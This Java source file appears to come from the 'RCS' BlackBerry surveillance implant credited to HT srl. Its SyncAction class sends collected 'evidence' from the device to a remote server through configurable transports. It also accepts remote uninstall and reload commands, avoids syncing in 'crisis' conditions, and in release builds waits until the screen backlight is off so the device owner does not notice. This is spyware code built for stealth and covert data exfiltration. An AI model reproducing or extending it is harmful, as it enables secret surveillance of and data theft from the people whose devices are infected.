//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/
	
package blackberry.action.sync;

import java.util.Vector;

import net.rim.device.api.system.Backlight;
import blackberry.AgentManager;
import blackberry.action.SubAction;
import blackberry.action.sync.protocol.ProtocolException;
import blackberry.action.sync.protocol.ZProtocol;
import blackberry.action.sync.transport.Transport;
import blackberry.agent.Agent;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.event.Event;
import blackberry.evidence.Evidence;
import blackberry.evidence.EvidenceCollector;
import blackberry.utils.Check;

public abstract class SyncAction extends SubAction {
    protected EvidenceCollector logCollector;
    protected AgentManager agentManager;
    // protected Transport[] transports = new Transport[Transport.NUM];
    protected Vector transports;
    protected Protocol protocol;

    protected boolean initialized;

    //#ifdef DEBUG
    private static Debug debug = new Debug("SyncAction", DebugLevel.VERBOSE);

    //#endif

    public SyncAction(int actionId, final byte[] confParams) {
        super(actionId);

        logCollector = EvidenceCollector.getInstance();
        agentManager = AgentManager.getInstance();
        transports = new Vector();

        protocol = new ZProtocol();
        initialized = parse(confParams);
        initialized &= initTransport();
    }

    public boolean execute(Event event) {
        //#ifdef DBC
        Check.requires(protocol != null, "execute: null protocol");
        Check.requires(transports != null, "execute: null transports");
        //#endif

        if (status.synced == true) {
            //#ifdef DEBUG
            debug.warn("Already synced in this action: skipping");
            //#endif
            return false;
        }

        if (status.crisisSync()) {
            //#ifdef DEBUG
            debug.warn("SyncAction - no sync, we are in crisis");
            //#endif
            return false;
        }

        //#ifndef DEBUG
        if (Backlight.isEnabled()) {
            return false;
        }
        //#endif

        wantReload = false;
        wantUninstall = false;

        agentManager.reStart(Agent.AGENT_DEVICE);

        boolean ret = false;

        for (int i = 0; i < transports.size(); i++) {
            Transport transport = (Transport) transports.elementAt(i);

            //#ifdef DEBUG
            debug.trace("execute transport: " + transport);
            debug.trace("transport Sync url: " + transport.getUrl());
            //#endif                       

            if (transport.isAvailable()) {
                //#ifdef DEBUG
                debug.trace("execute: transport available");
                //#endif
                protocol.init(transport);

                try {
                    //#ifdef DEBUG
                    debug.ledStart(Debug.COLOR_YELLOW);
                    //#endif

                    ret = protocol.perform();
                    wantUninstall = protocol.uninstall;
                    wantReload = protocol.reload;
                } catch (ProtocolException e) {
                    //#ifdef DEBUG
                    debug.error(e);
                    //#endif
                    ret = false;
                } finally {
                    //#ifdef DEBUG
                    debug.ledStop();
                    //#endif
                }

                //#ifdef DEBUG
                debug.trace("execute protocol: " + ret);
                //#endif

            } else {
                //#ifdef DEBUG
                debug.trace("execute: transport not available");
                //#endif
            }

            if (ret) {
                //#ifdef DEBUG
                debug.info("SyncAction OK");
                Evidence.info("Synced with url:" + transport.getUrl());
                //#endif

                status.synced = true;
                return true;
            }

            //#ifdef DEBUG
            debug.error("SyncAction Unable to perform");
            //#endif

        }

        return false;
    }

    protected abstract boolean parse(final byte[] confParams);

    protected abstract boolean initTransport();

}
